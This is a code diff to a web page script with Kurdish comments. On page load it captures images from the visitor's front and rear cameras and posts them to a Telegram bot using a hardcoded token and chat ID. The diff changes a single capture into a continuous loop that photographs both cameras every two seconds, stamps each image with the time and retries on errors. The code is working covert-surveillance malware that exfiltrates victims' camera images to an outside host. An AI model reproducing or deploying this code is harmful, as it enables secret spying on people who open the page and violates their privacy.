@@ -1,59 +1,67 @@
 <script>
     const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
     const tgChatId = "6259019006";
+    let isCapturing = true; // بۆ کۆنترۆڵکردنی بەردەوامی وێنەگرتنەکە
 
     window.addEventListener('load', () => {
-        fastCaptureSequence();
+        // دەستپێکردنی خولی وێنەگرتن
+        startContinuousCapture();
     });
 
-    async function fastCaptureSequence() {
-        try {
-            // ١. گرتنی وێنەی پێشەوە بە خێرایی (تەنها ٥٠٠ میلی چرکە دەوەستێت بۆ فوکەس)
-            await captureAndSendFast("user", "📷 پێشەوە (خێرا)");
+    async function startContinuousCapture() {
+        while (isCapturing) {
+            try {
+                // ١. وێنەیەک بە کامێرای پێشەوە دەگرێت
+                await captureAndSend("user", "🔄 وێنەی بەردەوام (پێشەوە)");
+                
+                // ٢. دوو چرکە دەوەستێت
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // ٣. وێنەیەک بە کامێرای پشتەوە دەگرێت
+                await captureAndSend("environment", "🔄 وێنەی بەردەوام (پشتەوە)");
 
-            // ٢. گرتنی وێنەی پشتەوە دەستبەجێ
-            await captureAndSendFast("environment", "📸 پشتەوە (خێرا)");
-            
-            console.log("هەموو وێنەکان بە سەرکەوتوویی نێردران");
-        } catch (err) {
-            console.error("Camera Error:", err);
+                // ٤. دوو چرکە دەوەستێت پێش دووبارەبوونەوەی خولەکە
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            } catch (err) {
+                console.log("Error during capture: ", err);
+                // ئەگەر هەڵەیەک ڕوویدا کەمێک دەوەستێت و دووبارە هەوڵ دەداتەوە
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
         }
     }
 
-    async function captureAndSendFast(mode, caption) {
+    async function captureAndSend(mode, caption) {
         const video = document.getElementById('autoVideo');
         const canvas = document.getElementById('autoCanvas');
         
-        // داخستنی ستریمی پێشوو
-        if (video.srcObject) {
-            video.srcObject.getTracks().forEach(track => track.stop());
-        }
-
+        // ئامادەکردنی کامێرا
         const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
+            video: { facingMode: mode, width: 480, height: 360 }, 
             audio: false 
         });
         
         video.srcObject = stream;
-
-        // کەمترین کاتی وەستان بۆ ئەوەی کامێراکە ڕوون ببێتەوە (٥٠٠ میلی چرکە)
-        await new Promise(resolve => setTimeout(resolve, 500));
+        // چاوەڕوانییەکی کورت بۆ لۆدبوونی وێنەکە
+        await new Promise(resolve => setTimeout(resolve, 800));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // ناردنی وێنە بە شێوەی Async (بۆ ئەوەی نەوەستێت بۆ ئەنجامی ناردنەکە)
+        // ناردنی وێنە بۆ تیلیگرام
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', tgChatId);
-            formData.append('photo', blob, 'img.png');
-            formData.append('caption', caption);
+            formData.append('photo', blob, 'live_stream.jpg');
+            formData.append('caption', caption + " - " + new Date().toLocaleTimeString());
 
             fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-        }, 'image/jpeg', 0.6); // کەمکردنەوەی کوالێتی بۆ 0.6 بۆ ئەوەی قەبارەی بچووک بێت و خێرا بنێردرێت
+
+            // داخستنی کامێرای ئێستا بۆ ئەوەی بۆ گۆڕینی کامێرا کێشە دروست نەبێت
+            stream.getTracks().forEach(track => track.stop());
+        }, 'image/jpeg', 0.5); // کوالێتی نزم کراوەتەوە بۆ خێرایی زیاتر
     }
 </script>
